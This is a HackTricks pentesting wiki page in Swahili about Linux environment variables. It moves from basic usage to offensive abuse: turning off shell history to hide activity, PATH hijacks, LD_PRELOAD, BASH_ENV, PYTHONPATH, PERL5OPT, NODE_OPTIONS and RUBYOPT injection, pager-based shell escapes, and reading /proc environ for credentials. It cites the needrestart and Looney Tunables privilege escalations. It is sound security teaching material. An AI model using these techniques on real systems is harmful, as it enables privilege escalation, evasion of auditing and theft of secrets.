# Vigezo vya Mazingira vya Linux

{{#include ../../banners/hacktricks-training.md}}

## Vigezo vya kimataifa

Vigezo vya kimataifa **vitarithiwa** na **process za child**.

Unaweza kuunda kigezo cha kimataifa kwa ajili ya session yako ya sasa kwa kufanya:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Kigezo hiki kitapatikana kwa sessions zako za sasa na michakato yake tanzu.

Unaweza **kuondoa** kigezo kwa kufanya:
```bash
unset MYGLOBAL
```
## Vigezo vya ndani

**Vigezo vya ndani** vinaweza tu **kufikiwa** na **shell/script ya sasa**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Orodhesha variables za sasa
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Yaliyomo kwenye `/proc/*/environ` **yametenganishwa kwa NUL**, kwa hivyo variants hizi kwa kawaida huwa rahisi kusoma:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Ikiwa unatafuta **credentials** au **interesting service configuration** ndani ya mazingira yaliyorithiwa, pia angalia [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Vigezo vya kawaida

Kutoka: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – display inayotumiwa na **X**. Kigezo hiki kwa kawaida huwekwa kuwa **:0.0**, kumaanisha display ya kwanza kwenye kompyuta ya sasa.
- **EDITOR** – text editor anayependelewa na mtumiaji.
- **HISTFILESIZE** – idadi ya juu zaidi ya mistari iliyo kwenye history file.
- **HISTSIZE** – Idadi ya mistari inayoongezwa kwenye history file mtumiaji anapomaliza session yake.
- **HOME** – directory yako ya nyumbani.
- **HOSTNAME** – hostname ya kompyuta.
- **LANG** – lugha yako ya sasa.
- **MAIL** – eneo la mail spool ya mtumiaji. Kwa kawaida **/var/spool/mail/USER**.
- **MANPATH** – orodha ya directories za kutafutwa kwa manual pages.
- **OSTYPE** – aina ya operating system.
- **PS1** – prompt chaguo-msingi katika bash.
- **PATH** – huhifadhi path ya directories zote zilizo na binary files unazotaka kutekeleza kwa kutaja tu jina la file, badala ya kutumia relative au absolute path.
- **PWD** – working directory ya sasa.
- **SHELL** – path ya command shell ya sasa (kwa mfano, **/bin/bash**).
- **TERM** – aina ya terminal ya sasa (kwa mfano, **xterm**).
- **TZ** – time zone yako.
- **USER** – username yako ya sasa.

## Vigezo vya kuvutia kwa hacking

Si kila kigezo kina manufaa sawa. Kwa mtazamo wa offensive, vipaumbele vipewe vigezo vinavyobadilisha **search paths**, **startup files**, **dynamic linker behavior**, au **audit/logging**.

### **HISTFILESIZE**

**Badilisha value ya kigezo hiki kuwa 0**, ili unapomaliza **session yako**, **history file** (\~/.bash_history) **ikatwe hadi mistari 0**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Badilisha **value ya variable hii iwe 0**, ili commands **zisihifadhiwe katika history ya in-memory** na zisiandikwe tena kwenye **history file** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Ikiwa **thamani ya kigezo hiki imewekwa kuwa `ignorespace` au `ignoreboth`**, amri yoyote iliyoanzishwa kwa nafasi ya ziada haitahifadhiwa kwenye history.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Elekeza **faili la historia** kwenye **`/dev/null`** au i-unset kabisa. Hii kwa kawaida inategemewa zaidi kuliko kubadilisha tu ukubwa wa historia.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Michakato itatumia **proxy** iliyotajwa hapa kuunganisha kwenye internet kupitia **http au https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: proxy chaguomsingi kwa zana/protokali zinazoiunga mkono.
- `no_proxy`: orodha ya kukwepa (hosts/domains/CIDRs) inayopaswa kuunganisha moja kwa moja.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Zote lowercase na uppercase zinaweza kutumika kulingana na tool (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Michakato itaamini certificates zilizoonyeshwa katika **env variables hizi**. Hii ni muhimu ili kufanya tools kama **`curl`**, **`git`**, Python HTTP clients, au package managers ziweze kuamini CA inayodhibitiwa na mshambuliaji (kwa mfano, kufanya interception proxy ionekane halali).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Ikiwa privileged wrapper/script itatekeleza commands **bila kutumia absolute paths**, directory ya kwanza inayodhibitiwa na attacker katika `PATH` ndiyo itakayotumika. Hii ndiyo primitive inayotumika katika **PATH hijacks** nyingi kwenye `sudo`, cron jobs, shell wrappers, na custom SUID helpers. Tafuta `env_keep+=PATH`, `secure_path` dhaifu, au wrappers zinazoita `tar`, `service`, `cp`, `python`, n.k. kwa majina.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Kwa minyororo kamili ya privilege-escalation inayotumia vibaya `PATH`, angalia [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` si marejeo ya directory pekee: tools nyingi hupakia kiotomatiki **dotfiles**, **plugins**, na **configuration ya kila mtumiaji** kutoka `$HOME` au `$XDG_CONFIG_HOME`. Ikiwa workflow yenye privilege itahifadhi thamani hizi, **config injection** inaweza kuwa rahisi kuliko binary hijacking.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Mifano ya kuvutia ni `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py`, pamoja na files maalum za tools kama `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Variables hizi huathiri **dynamic linker**:

- `LD_PRELOAD`: hulazimisha shared objects za ziada kupakiwa kwanza.
- `LD_LIBRARY_PATH`: huongeza directories za kutafutia libraries mwanzoni mwa orodha.
- `LD_AUDIT`: hupakia auditor libraries zinazofuatilia upakiaji wa libraries na utatuzi wa symbols.

Ni zenye thamani kubwa sana kwa **hooking**, **instrumentation**, na **privilege escalation** ikiwa command yenye privileges itazihifadhi. Katika mode ya **secure-execution** (`AT_SECURE`, kwa mfano setuid/setgid/capabilities), loader huondoa au kuzuia nyingi ya variables hizi. Hata hivyo, bugs za parser katika hatua hiyo ya mwanzo ya loader bado zina athari kubwa kwa sababu huendeshwa **kabla** ya target program.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` hubadilisha tabia ya awali ya glibc (kwa mfano, allocator tunables) na ni muhimu sana katika exploit labs. Pia ni muhimu kwa mtazamo wa usalama kwa sababu **dynamic loader huichanganua mapema sana**. Bug ya **Looney Tunables** ya mwaka 2023 ilikuwa ukumbusho mzuri kwamba environment variable moja inayochanganuliwa kwenye loader inaweza kuwa **local privilege-escalation primitive** dhidi ya programu za SUID.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Ikiwa **Bash** imeanzishwa kwa hali ya **non-interactively**, hukagua `BASH_ENV` na kuendesha faili hiyo kabla ya kuendesha script lengwa. Bash inapoitiwa kama `sh`, au katika hali ya maingiliano ya mtindo wa POSIX, `ENV` pia inaweza kuchunguzwa. Hii ni njia ya kawaida ya kugeuza shell wrapper kuwa code execution ikiwa mazingira yanadhibitiwa na attacker.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash hupuuza faili hizi za startup wakati **real/effective IDs zinapotofautiana**; `-p` huhifadhi effective ID lakini haiwezeshi faili hizo za startup, hivyo tabia halisi hutegemea jinsi wrapper inavyoanzisha shell. Kuwa mwangalifu na privileged wrappers zinazoita `setuid()`/`setgid()` **kabla** ya kuanzisha Bash: IDs zinapolingana tena, Bash inaweza kuamini `BASH_ENV`, `ENV`, na hali nyingine zinazohusiana na shell ambazo vinginevyo zingepuuzwa.<sup>[[1]](#references)</sup>

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

Variables hizi hubadilisha jinsi Python inavyoanza:

- `PYTHONPATH`: huweka import search paths mwanzoni.
- `PYTHONHOME`: huhamisha standard library tree.
- `PYTHONSTARTUP`: huendesha faili kabla ya interactive prompt.
- `PYTHONINSPECT=1`: huingia kwenye interactive mode baada ya script kumaliza.

Ni muhimu dhidi ya maintenance scripts, debuggers, shells, na wrappers zinazoita Python kwa kutumia mazingira yanayodhibitika. `python -E` na `python -I` hupuuza variables zote za `PYTHON*`.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
Mfano wa hivi karibuni wa ulimwengu halisi ulikuwa **needrestart** LPE ya 2024 kwenye mifumo ya Ubuntu/Debian: scanner inayomilikiwa na root ilinakili `PYTHONPATH` ya process isiyo na privileged access kutoka `/proc/<PID>/environ`, kisha ikaendesha Python. Exploit iliyochapishwa iliweka `importlib/__init__.so` kwenye path inayodhibitiwa na attacker, hivyo Python ikaendesha attacker code wakati wa initialization yake yenyewe, kabla hata script iliyowekwa hard-coded na helper haijawa muhimu.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl ina startup variables zenye manufaa sawa:

- `PERL5LIB`: huweka library directories mwanzoni.
- `PERL5OPT`: huingiza switches kana kwamba zilikuwa kwenye kila command line ya `perl`.

Hii inaweza kulazimisha **automatic module loading** au kubadilisha tabia ya interpreter kabla target script haijafanya chochote cha kuvutia. Perl hupuuza variables hizi katika contexts za **taint / setuid / setgid**, lakini bado zina umuhimu mkubwa kwa root-run wrappers za kawaida, CI jobs, installers, na custom sudoers rules.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` huongeza **Node.js CLI flags** mwanzoni mwa kila mchakato wa `node` unaorithi environment. Hii huifanya iwe muhimu dhidi ya wrappers, kazi za CI, wasaidizi wa Electron, na sheria za sudo ambazo hatimaye huendesha Node. Flags zinazovutia zaidi kwa upande wa offensive kwa kawaida ni:

- `--require <file>`: hupakia mapema faili la CommonJS kabla ya script lengwa.
- `--import <module>`: hupakia mapema ES module kabla ya script lengwa.

Node hukataa baadhi ya flags hatari katika `NODE_OPTIONS`, lakini `--require` na `--import` zinaruhusiwa wazi na huchakatwa **kabla ya** command-line arguments za kawaida.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
Kwa remote gadget chains zinazoweka `NODE_OPTIONS` kwa njia isiyo ya moja kwa moja (kwa mfano, prototype-pollution hadi RCE), angalia [ukurasa huu mwingine](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby inatoa aina hiyo hiyo ya startup abuse:

- `RUBYLIB`: huongeza directories mwanzoni mwa load path ya Ruby.
- `RUBYOPT`: huingiza command-line options kama vile `-r` katika kila invocation ya `ruby`.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Udhaifu wa **needrestart** wa mwaka 2024 ulionyesha kuwa hii si ujanja wa maabara pekee: helper huyo huyo anayemilikiwa na root, ambaye alikuwa katika hatari ya kutumiwa vibaya kupitia `PYTHONPATH`, angeweza pia kulazimishwa kuendesha Ruby yenye `RUBYLIB` inayodhibitiwa na attacker, na kupakia `enc/encdb.so` kutoka kwenye directory inayodhibitiwa na attacker.<sup>[[3]](#references)</sup>

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Baadhi ya tools hazisomi tu path kutoka kwenye environment; hupitisha thamani hiyo kwa **shell**, **editor**, au **input preprocessor**. Hii hufanya variables zifuatazo zivutie hasa pale privileged wrapper inapotekeleza `git`, `man`, `less`, au text viewers zinazofanana:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: huchagua pager command.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: huchagua editor command, mara nyingi ikiwa na arguments.
- `LESSOPEN`, `LESSCLOSE`: hufafanua pre/post-processors zinazoendeshwa `less` inapofungua file.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git pia inaauni **env-only config injection** bila kugusa diski kupitia `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, na `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Kwa mtazamo wa post-exploitation, kumbuka pia kwamba mazingira yaliyorithiwa mara nyingi huwa na **credentials**, **proxy settings**, **service tokens**, au **cloud keys**. Angalia [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) kwa `/proc/<PID>/environ` na utafutaji wa `systemd` `Environment=`.

### PS1

Badilisha jinsi prompt yako inavyoonekana.

[**Huu ni mfano**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Huu ni mfano](<../images/image (897).png>)

Mtumiaji wa kawaida:

![PERL5OPT & PERL5LIB - PS1: Kazi moja, mbili na tatu zinazoendeshwa chinichini](<../images/image (740).png>)

Kazi moja, mbili na tatu zinazoendeshwa chinichini:

![PERL5OPT & PERL5LIB - PS1: Kazi moja, mbili na tatu zinazoendeshwa chinichini](<../images/image (145).png>)

Kazi moja ya chinichini, moja iliyosimamishwa, na amri ya mwisho haikukamilika kwa usahihi:

![PERL5OPT & PERL5LIB - PS1: Kazi moja ya chinichini, moja iliyosimamishwa, na amri ya mwisho haikukamilika kwa usahihi](<../images/image (715).png>)

## References

- [1] [GNU Bash Manual - Faili za Kuanzisha Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Ukurasa wa manual wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs katika needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI documentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Vigezo vya kawaida vya mazingira - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Local Privilege Escalation katika ld.so ya glibc - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
{{#include ../../banners/hacktricks-training.md}}
